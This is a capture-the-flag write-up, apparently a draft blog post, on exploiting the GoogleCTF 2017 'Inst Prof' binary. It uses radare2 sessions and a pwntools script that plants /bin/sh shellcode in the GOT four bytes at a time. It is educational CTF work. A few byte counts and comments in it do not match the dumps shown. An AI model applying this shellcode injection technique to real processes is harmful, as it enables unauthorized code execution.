---
title: "GoogleCTF 2017 - Inst Prof (Part 2)"
description: GoogleCTF 2017 - Inst prof (Part 2)

date: 2017-09-24T18:56:18+02:00
publishdate: 2017-10-25T18:56:18+02:00
draft: true

summary: "Once we have understood how the binary works (this was explained in part 1, we can move forward to understand how can we exploit this."
cardthumbimage: "/assets/GoogleCTF2017/title.jpg"

author:
  email: tzaoh1@gmail.com
  github: https://github.com/tzaoh
  image:
  - /images/avatar-64x64.png
  name:
  - Tzaoh

cardbackground: 'white'
cardtitlecolor: 'orange'

post_categories:
- CTFs

tags:
- CTF
- GoogleCTF
- 2017

---

This post is the following part of [this one](../inst_prof_p1). Basically the analysis phase is already done, so we can focus outselves on the exploitation phase.

#### Reminder

Just to remember what we explained in [part 1](../inst_prof_p1), here is an easy list with the normal flow of the process:

1. It allocates a memory page of `0x1000` bytes with read and write privileges (remember the `PROT_READ | PROT_WRITE` stuff).

2. It copies the following instructions inside of this page:  
{{< highlight r2 >}}
            0x7fd4a1197000      b900100000     ecx = 0x1000            
        ┌─> 0x7fd4a1197005      90                                     
        |   0x7fd4a1197006      90                                     
        |   0x7fd4a1197007      90                                     
        |   0x7fd4a1197008      90                                     
        |   0x7fd4a1197009      83e901         ecx -= 1                
        └─< 0x7fd4a119700c      75f7           if (var) goto 0x7fd4a1197005 ; likely
            0x7fd4a119700e      c3                                     
{{< /highlight >}}

3. Later on, it reads an input from `stdin` and uses the first `4 bytes` to overwrite the `nop` opcodes we saw in the previous point (those `90`). For example, if we input the character `\xc3` (which is the opcode for `ret` instruction) four times, we will get this:  
{{< highlight r2 >}}
$ r2 -Ad -R "stdin=\"`echo -ne "\xc3\xc3\xc3\xc3"`\"" -c 'dcu `/r sym.read_inst~[1]`; dso; pd 8 @ r:rbx;' inst_prof
            0x7f6b63902000      b900100000     ecx = 0x1000            
        ┌─> 0x7f6b63902005      c3                                     
        |   0x7f6b63902006      c3                                     
        |   0x7f6b63902007      c3                                     
        |   0x7f6b63902008      c3                                     
        |   0x7f6b63902009      83e901         ecx -= 1                
        └─< 0x7f6b6390200c      75f7           if (var) goto 0x7f6b63902005 ; likely
            0x7f6b6390200e      c3                                     
{{< /highlight >}}

4. It uses a function called `sym.make_page_executable` to update the permissions of the above memory region where the code resides. These permissions change from **read** and **write** (-rw-) to **read** and **execute** (-r-x).

5. After these permissions have been updated, the process will execute our inserted bytes or instructions.

6. It deallocates de memory region.

7. And it starts again.

---

#### Objective

So, our goal is to allocate an entire [shellcode](https://en.wikipedia.org/wiki/Shellcode) somewhere in memory and redirect the execution flow to it. We have some little problems regarding this:

1. We have to do it using instructions formed with 4 bytes as max (remember the process will only read 4 bytes each time you send something).

2. Furthermore, If the instruction provided is a 4-byte one, it will be executed `4096` (or `0x1000`) times because it will be inserted inside a loop.  
If it has less, we could avoid this behavior adding an extra byte: `c3` which is the opcode for the return statement. If we use it we will break the mentioned loop.

3. We need an **address** to write the bytes to and the section this address belongs to must have execution permissions.

4. We will need to save some stuff on the registers, i.e. the address we are going to copy our shellcode to. We will need to identify which registers are **not used** from our first input to the next one.

---

#### How to

To code an exploit, I decided to use python along with a fully recommended library called [pwntools](https://github.com/Gallopsled/pwntools).  
The main reasons to use this library are:

1. It allows us to start a local process or to connect to a remote one with a single line and in a simple way. Just like this:  
```python
# Execute the local binary
p = process("./inst_prof")
# Connect to the remote process
p = remote("inst-prof.ctfcompetition.com", 1337)
```

2. Instead of sending the opcodes directly we can use the `asm()` instruction. Remember that we should tell `pwntools` which architecture and operating system we are expecting. We do this through the `context()` instruction. An example of this would be:  
```python
context(arch='amd64', os='linux')
p.send(asm('mov r13, [rsp]'))
```

All right, so first we need a shellcode. I am using this one, but you can search for [another](https://www.google.com/search?q=shellcode+bin+sh+x64+linux) if you want (have in mind that not all of them works).
```python
shellcode = (
    "\xb0\x3b\x99\x48\xbb\x2f"
    "\x62\x69\x6e\x2f\x2f\x73"
    "\x68\x52\x53\x54\x5f\x52"
    "\x57\x54\x5e\x0f\x05"
)
```

We can copy the shellcode byte by byte using the following asm instruction:
```asm
mov byte [r15], {byte}
```

Lets check how many bytes that instruction requires. We are going to try it with the first byte of the above shellcode:
```bash
$ rasm2 -a x86 -c 64 'mov byte [r15], 0xb0'
41c607b0
```
> `-a x86` tells `rasm2` to compile the instruction for the architecture `x86`.  
`-c 64` indicates we want it for a 64 bits cpu.

Four bytes. That means that we cannot apply a `ret` instruction.
{{< highlight r2 "hl_lines=3" >}}
[0x7f556238a000 230 /root/inst_prof]> pd $r @ map.unk2._rw_
            0x7f556238a000      b900100000             ecx = 0x1000
        ┌─> 0x7f556238a005      41c607b0               byte [r15] = 0xb0
        |   0x7f556238a009      83e901                 ecx -= 1
        └─< 0x7f556238a00c      75f7                   if (var) goto 0x7f556238a005
            0x7f556238a00e      c3                     
{{< /highlight >}}

So the loop will write `4096` times `0xb0` on the same address. Fair enough, it is a waste of cycles but it will work.  
This way we can copy the 23 bytes of the shellcode.

We need to know a couple more things are:

**1.** an initial **address** where to start writing our shellcode. Ideally, we would want to use a memory area with `write` and `execution` permissions, but there is none. So I will use a section that has at least `write` permissions like the [GOT](https://en.wikipedia.org/wiki/Global_Offset_Table) section.

{{< highlight r2 "hl_lines=3" >}}
[0x5569ad584b18]> dm~rwx
[0x5569ad584b18]> dm~rw-
usr     4K 0x00005569ad786000 - 0x00005569ad787000 s -rw- /root/inst_prof /root/inst_prof ; obj._GLOBAL_OFFSET_TABLE_
usr     8K 0x00007f0efa979000 - 0x00007f0efa97b000 s -rw- /lib/x86_64-linux-gnu/libc-2.24.so /lib/x86_64-linux-gnu/libc-2.24.so
usr    16K 0x00007f0efa97b000 - 0x00007f0efa97f000 s -rw- unk0 unk0
usr     8K 0x00007f0efab80000 - 0x00007f0efab82000 s -rw- unk1 unk1
usr    12K 0x00007f0efab9f000 - 0x00007f0efaba2000 s -rw- unk3 unk3
usr     4K 0x00007f0efaba3000 - 0x00007f0efaba4000 s -rw- /lib/x86_64-linux-gnu/ld-2.24.so /lib/x86_64-linux-gnu/ld-2.24.so
usr     4K 0x00007f0efaba4000 - 0x00007f0efaba5000 s -rw- unk4 unk4 ; map.unk0._rw_
usr   132K 0x00007ffd4fb3c000 - 0x00007ffd4fb5d000 s -rw- [stack] [stack] ; map._stack_._rw_
{{< /highlight >}}

> `dm` list the memory maps of the current process.  
`~rwx` or `~rw-` is used to filter between all the mappings of the process.

In this case `0x00005569ad786000` is the address we are looking for **BUT** remember `PIC` flag is enabled so our executable will be loaded at a random address each time it will be launched.

This is a problem that can be solved thinking that even being loaded at a different place, **THE DISTANCE** between some specific points will always be the same. We will take the first value the `rsp` register is pointing to (which is going to be a return address, the address right after the `call rbx` instruction).

{{< highlight r2 "hl_lines=4" >}}
[0x558cfc7d3b16 230 /root/inst_prof]> pd $r @ hit0_0
|           ;-- hit0_0:
│           0x558cfc7d3b16 b    ffd3           rbx ()
│           0x558cfc7d3b18      0f31                 
│           0x558cfc7d3b1a      bf01000000     edi = 1
│           0x558cfc7d3b1f      48c1e220       rdx <<<= 0x20
{{< /highlight >}}

and get the difference between that address and the address of the GOT.

```r2
[0x7f8b1803b000]> ? section..got.plt - [rsp]
2102504 0x2014e8 010012350 2M 20000:04e8 2102504 "\xe8\x14 " 001000000001010011101000 2102504.0 2102504.000000f 2102504.000000
```

This way we will not need to worry about where is the `GOT` located: it will always be at `[rsp] + 0x2014e8`. We will need to generate that value and save it into a register.

**2.** and a **register** to store that address.

To know which registers we can use, we will stop the execution just before the first 4 input bytes, alter some registers (I did this using `r13`, `r14` and `r15` but you can use the ones you want, just remember you will maybe need the values of the rest of the registers to generate `0x2014e8`), read another 4 bytes and check if any of them have been changed.

{{< highlight r2 "hl_lines=11 19" >}}
$ r2 -Ad -R "stdin=\"`python -c 'print(\"\xc3\" * 8)'`\"" -c 'dcu main; db `/a call rbx~[0]`; dc; 2ds; dr r13=0x1111; dr r14=0x2222; dr r15=0x3333; Vpp' inst_prof
[0x7f166f142000 230 /root/inst_prof]> ?0;f tmp;s.. @ rbx
- offset -       0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0x7fffb7fbd398  182b c6a0 6755 0000 a02c f36e 167f 0000  .+..gU...,.n....
0x7fffb7fbd3a8  0000 0000 0000 0000 0000 0000 0000 0000  ................
0x7fffb7fbd3b8  c928 c6a0 6755 0000 d0d3 fbb7 ff7f 0000  .(..gU..........
0x7fffb7fbd3c8  c728 c6a0 6755 0000 602b c6a0 6755 0000  .(..gU..`+..gU..
 rax 0x00000000           rbx 0x7f166f142000       rcx 0x00001000
 rdx 0x4e0200000000        r8 0xffffffffffffffff    r9 0x00000000
 r10 0x00000487           r11 0x00000202           r12 0x4e029a1c56e7
 r13 0x00001111           r14 0x00002222           r15 0x00003333
 rsi 0x00001000           rdi 0x7f166f142000       rsp 0x7fffb7fbd398
 rbp 0x7fffb7fbd3c0       rip 0x7f166f142005       rflags 1PI
orax 0xffffffffffffffff
            ;-- rbx:
            ;-- rdi:
            0x7f166f142000      b900100000     ecx = 0x1000            ; rsi
        ┌─> ;-- rip:
        ┌─> 0x7f166f142005      c3 
        |   0x7f166f142006      c3 
        |   0x7f166f142007      c3 
        |   0x7f166f142008      c3 
        |   0x7f166f142009      83e901         ecx -= 1
        └─< 0x7f166f14200c      75f7           if (var) goto 0x7f166f142005 ;[1] ; rip; likely
            0x7f166f14200e      c3 
{{< /highlight >}}

> `r2 -Ad ... inst_prof`: Analyze and open for debugging the specified binary.  
``-X "stdin=\"`python -c 'print(\"\xc3\" * 8)'`\""``: This is just to generate 8 `\xc3` bytes for the standard input.  
``dcu main``: Execute until `main` is reached.  
``db `/a call rbx~[0]` ``: Once `main` is reached we can search for the address of the `call rbx` instruction  
``dc; 2ds;``:  
``dr r13=0x1111; dr r14=0x2222; dr r15=0x3333;``: change the values of 3 registers.  
`Vpp`: To activate visual mode.

In short, with the latest command we are sending two inputs of `4 bytes` each. These 4 bytes groups are `\xc3\xc3\xc3\xc3`, which means 4 `ret` instructions.

With the first input, we are stopped at the first `ret` opcode. Once there, we change the value of some registers (I choose some of them to not do this longer than necessary) and resume the flow execution.

If the values of the registers we modified are the same in the next iteration of `do_test`, it will mean those registers are reliable to be used in our exploit. 

Press `:` and type `dc;ds` now. We are in the next iteration of the loop with the following 4 bytes. As you may see, `r13` `r14` and `r15` has the same values, so we can assume we can use those 3 registers in our exploit.
{{< highlight r2 "hl_lines=10" >}}
[0x7fa647873000 230 /root/inst_prof]> ?0;f tmp;s.. @ rbx 
- offset -       0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0x7ffed3ffc748  18eb 4887 f455 0000 a03c 6647 a67f 0000  ..H..U...<fG....
0x7ffed3ffc758  5d91 fc8c 0800 0000 0000 0000 0000 0000  ]...............
0x7ffed3ffc768  c9e8 4887 f455 0000 80c7 ffd3 fe7f 0000  ..H..U..........
0x7ffed3ffc778  c7e8 4887 f455 0000 60eb 4887 f455 0000  ..H..U..`.H..U..
 rax 0x00000000           rbx 0x7fa647873000       rcx 0x7fa64739b4c7     
 rdx 0xf26700000000        r8 0xffffffffffffffff    r9 0x00000000         
 r10 0x00000022           r11 0x00000246           r12 0xf267c0c00651     
 r13 0x00001111           r14 0x00002222           r15 0x00003333         
 rsi 0x00001000           rdi 0x7fa647873000       rsp 0x7ffed3ffc748     
 rbp 0x7ffed3ffc770       rip 0x7fa647873000       rflags 1I              
orax 0xffffffffffffffff               
{{< /highlight >}}

All right, lets see what is the initial values of all the registers and think how we can generate the value `0x2014e8`, add it to `[rsp]` and save it in one of our three registers (`r13`, `r14` or `r15`).

{{< highlight r2 "hl_lines=5" >}}
$ r2 -Ad -R "stdin=\"`python -c 'print(\"\xc3\" * 8)'`\"" -c 'dcu main; dcu `/a call rbx~[0]`; ds; dr=' inst_prof
 rax 0x00000000           rbx 0x7f7d18d63000       rcx 0x7f7d1888b4c7
 rdx 0x10b2e00000000       r8 0xffffffffffffffff    r9 0x00000000
 r10 0x00000487           r11 0x00000206           r12 0x10b2efa655245
 r13 0x7ffe8c2b98a0       r14 0x00000000           r15 0x00000000
 rsi 0x00001000           rdi 0x7f7d18d63000       rsp 0x7ffe8c2b9790
 rbp 0x7ffe8c2b97b0       rip 0x561095b73b16       rflags 1I
orax 0xffffffffffffffff  
{{< /highlight >}}

I started like this:
```python
ret = asm('ret')                            # "\xc3"

# We store the return address at r13
p.send(asm('mov r13, [rsp]'))               # "\x4c\x8b\x2c\x24"

# We need to get 0x2014e8 and add it to r13
p.send(asm('add r15, 0x20'))                # "\x49\x83\xc7\x20" -> r15 = 0x20 * 0x1000 -> 0x20000
# Remember that the instruction will be executed 0x1000 times if we do not add a "ret" opcode
# (and we can not do it due because it is a 4-byte instruction.)

# We send 0x10 times the next instruction.
# Each of this sends will not be executed 0x1000 times because we are adding a `ret` opcode.
inst = asm('add r14, r15') + ret
for i in range(0x10):
    p.send(inst)       # "\x4d\x01\xfe" + "\x3c"; r14 = 0x200000

# r10 is 0x487. If we add it 0x9D times to r14 we get...
inst = asm('add r14, r10') + ret            # "\x4d\x01\xd6" + "\x3c"
for i in range(0x9D):
    p.send(inst)                            # r14 = 0x2014da ! We are pretty close

# Adding 0xE 
inst = asm('inc r14') + ret                 # "\x49\xff\xc6" + "\xc3"
for i in range(0xE):
    p.send(inst)                            # r14 = 0x2014e8 !!

# r13 = [rsp] + 0x2014e8 = GOT TABLE
p.send(asm('add r13, r14') + ret)           # "\x4d\x01\xf5" + "\xc3"; 
```

Obviously, there is some data at the beginning of GOT section and we can avoid overwritting it. That's the reason of the following lines.
```python
# We make a copy of the initial address of the GOT
p.send(asm('mov r14, r13') + ret)           # "\x4d\x89\xee" + "\xc3";

# We add 0x80 to that copied address
inst = asm('inc r14') + ret                 # "\x49\xff\xc6" + "\xc3"; 
for i in range(0x80):
    p.send(inst)

# Copy of the address + 0x80.
# We need this copy to increment it as we copy each byte of the shellcode into memory
p.send(asm('mov r15, r14') + ret)           # "\x4d\x89\xf7" + "\xc3";

```

When the execution of this script reach this point, the value of `r13`, `r14` and `r15` will be:

1. `r13` = Beginning of GOT

2. `r14` = GOT + 0x80 = Start address of our shellcode

3. `r15` = GOT + 0x80 = Start address of our shellcode

> Why `r14` and `r15` has the same value?
It is just because we will increment `r15` one by one to use it to write each byte of the shellcode and we will need the initial value later.

At this point we want to write the entire shellcode at a register (`r14` or `r15`) incrementing it by one each time one of the bytes of the shellcode is stored.
```python
def writeByteString(str):
    mov_r15 = "\x41\xc6\x07"                # mov byte ptr [r15], {byte}
    inc_r15 = asm('inc r15') + ret          # "\x49\xff\xc7" + "\xc3"
    
    for byte in str:
        p.send(mov_r15 + byte)              
        p.send(inc_r15)                     # inc r15    
```

Up at this point the registers are as follows:

1. `r13` = Beginning of GOT

2. `r14` = GOT + 0x80 = Start address of our shellcode

3. `r15` = GOT + 0x80 + 0x23 = End address of our shellcode

Lets check all this code and show the memory of the process with r2 to ensure that our shellcode is there. [partial_solve.py](/assets/GoogleCTF2017/Inst Prof/solve1.py).
```bash
$ ./solve1.py
[+] Starting local process './inst_prof': pid 17632
initializing prof...ready
```

Once the script is initiated we open a new terminal and attach radare2 to the process and check if our shellcode has been inserted correctly.
{{< highlight r2 "hl_lines=9 10 11" >}}
$ r2 -d 17632
[0x55a0906d3070]> pxq @ section..got.plt 
0x55a0906d3000  0x0000000000201e08  0x00007f374aecf170   .. .....p..J7...
0x55a0906d3010  0x00007f374acbfcc0  0x00007f374a9e8710   ...J7......J7...
0x55a0906d3020  0x00007f374a9f13c0  0x000055a0904d17d6   ...J7.....M..U..
0x55a0906d3030  0x00007f374a9e86b0  0x00007f374a92d1f0   ...J7......J7...
0x55a0906d3040  0x000055a0904d1806  0x00007f374a9f1490   ..M..U.....J7...
0x55a0906d3050  0x00007f374a9f14c0  0x000055a0904d1836   ...J7...6.M..U..
0x55a0906d3060  0x000055a0904d1846  0x000055a0904d1856   F.M..U..V.M..U..
0x55a0906d3070  0x4850ec8948c03148  0x69622fffbb48e289   H1.H..PH..H../bi
0x55a0906d3080  0x08ebc14868732f6e  0x89485250e7894853   n/shH...SH..PRH.
0x55a0906d3090  0x3bb0e689485750e2  0x000000000000050f   .PWH...;........
0x55a0906d30a0  0x0000000000000000  0x0000000000000000   ................
0x55a0906d30b0  0x0000000000000000  0x0000000000000000   ................
0x55a0906d30c0  0x0000000000000000  0x0000000000000000   ................
0x55a0906d30d0  0x0000000000000000  0x0000000000000000   ................
0x55a0906d30e0  0x0000000000000000  0x0000000000000000   ................
0x55a0906d30f0  0x0000000000000000  0x0000000000000000   ................
{{< /highlight >}}


Nice! the shellcode is inserted
#### References